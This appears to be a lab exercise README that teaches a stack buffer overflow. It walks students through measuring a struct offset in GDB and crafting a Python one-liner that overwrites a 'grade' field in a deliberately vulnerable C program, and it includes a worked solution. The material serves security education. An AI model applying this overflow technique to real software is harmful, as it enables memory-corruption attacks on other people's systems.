# Level 1 — "Fix Your Grade" (Easy)

You are stuck with a grade of **D**. The program stores your `grade` right
next to your `name` in memory, and it reads your name with an unsafe function
that never checks how much you type. Overflow `name` to overwrite `grade`.

**Win condition:** make the program print

```text
Hi YOUR_NAME! Your grade is A+.

*** LEVEL 1 CLEARED ***
```

You do **not** edit `vulnerable.c`. You only craft the input you send it.

---

## Step 1 — Build

```bash
make
file vulnerable      # should say: ELF 32-bit ... Intel 80386
```

## Step 2 — Play it straight first

```bash
./vulnerable
```

Type a short name. Notice the grade stays `D`. Now try a very long name
(20+ characters). What happened to the grade? Why?

## Step 3 — Find the offset in GDB

The point of this level is to *measure*, not guess: how far is `grade` from the
start of `name`? Inspect the struct layout with GDB:

```bash
gdb -q -batch -ex "ptype /o student_t" ./vulnerable
```

You'll see each field's offset:

```text
type = struct {
/*      0      |      16 */    char name[16];
/*     16      |       4 */    char grade[4];
}
```

That left column is the **offset**: `name` starts at 0, `grade` starts at 16.
So you must write 16 bytes to fill `name` before `A+` lands on `grade`.

> Note on environments: on Apple Silicon Macs, the Docker container emulates
> x86 and cannot *run* a program under GDB (`break`/`run`/`step` fail with
> `ptrace: Function not implemented`). Static inspection like `ptype /o` and
> `disassemble` still works, which is all you need for this level. For full
> live debugging (stepping, live stack addresses) use a real x86 Linux box —
> a course server or an x86 VM (see the top-level README).

## Step 4 — Craft the payload

Your input needs to:

1. put your name in `name`,
2. place a `'\0'` right after your name (so `printf("%s", name)` stops there),
3. pad with filler until you have written OFFSET bytes total,
4. then write `A+` so it lands on `grade`.

Template (replace `NAME` and the padding count from your GDB offset):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"NAME\x00" + b"A"*PAD + b"A+")' | ./vulnerable
```

Worked example (name = `nawab`, offset = 16):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"nawab\x00" + b"A"*10 + b"A+")' | ./vulnerable
```

`nawab\x00` = 6 bytes, `A`*10 = 10 bytes → 16 bytes fill `name`, then `A+`
lands on `grade`.

## Step 5 — Submit

- The exact input (or Python one-liner) that clears the level.
- Your GDB output showing `&name`, `&grade`, and the offset.
- 3–4 sentences: where the overflow is, and how `name` sits relative to
  `grade` in memory.

---

## What you should understand after this

- Arrays are just consecutive bytes; C does not check bounds.
- Neighbors in memory can be corrupted by an overflow.
- `gets` is unsafe because it never learns the buffer size.
- Null terminators decide where `%s` stops printing.
